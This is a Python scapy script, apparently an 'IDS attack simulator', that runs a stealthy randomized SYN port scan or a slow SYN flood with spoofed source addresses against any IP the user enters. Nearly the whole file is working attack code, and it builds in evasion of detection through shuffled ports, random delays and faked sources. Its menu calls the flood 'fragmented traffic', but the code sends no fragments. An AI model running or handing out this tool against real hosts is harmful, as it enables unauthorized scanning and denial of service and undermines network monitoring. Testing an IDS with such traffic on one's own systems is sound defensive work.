import sys
import time
import random
from scapy.all import IP, TCP, UDP, send

def sneaky_port_scan(target_ip, ports):
    print(f"[?] Starting Sneaky Port Scan on {target_ip}...")
    random.shuffle(ports) # Randomize order to avoid sequential patterns
    for port in ports:
        print(f"    - Testing port {port} stealthily...")
        # Stealth SYN scan (just one packet, then wait)
        pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
        send(pkt, verbose=False)
        
        # Long random delay between ports (1-5 seconds)
        time.sleep(random.uniform(1.0, 5.0))
    print("[+] Sneaky scan finished.")

def slow_dos(target_ip, target_port, duration_sec=60):
    print(f"[?] Starting Slow DoS on {target_ip}:{target_port} for {duration_sec}s...")
    start_time = time.time()
    count = 0
    while time.time() - start_time < duration_sec:
        # Varying src_ip to make it look like different slow users
        src_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        pkt = IP(src=src_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
        send(pkt, verbose=False)
        count += 1
        
        # Slow interval (0.5 to 2.0 seconds)
        time.sleep(random.uniform(0.5, 2.0))
        if count % 10 == 0: print(f"    - Sent {count} slow packets...")
    print("[+] Slow DoS finished.")

if __name__ == "__main__":
    print("\n" + "="*40)
    print("  SNEAKY IDS ATTACK SIMULATOR")
    print("="*40)
    
    target = input("\nEnter Target IP: ").strip()
    if not target:
        sys.exit(1)
        
    print("\nSelect Sneaky Mode:")
    print("1. Stealth Port Scan (Randomized & Slow)")
    print("2. Low & Slow DoS (Fragmented Traffic)")
    
    choice = input("\nChoice (1-2): ")
    
    if choice == '1':
        # Pick 10 interesting ports
        test_ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 3389]
        sneaky_port_scan(target, test_ports)
    elif choice == '2':
        slow_dos(target, 80)
    else:
        print("Invalid choice.")
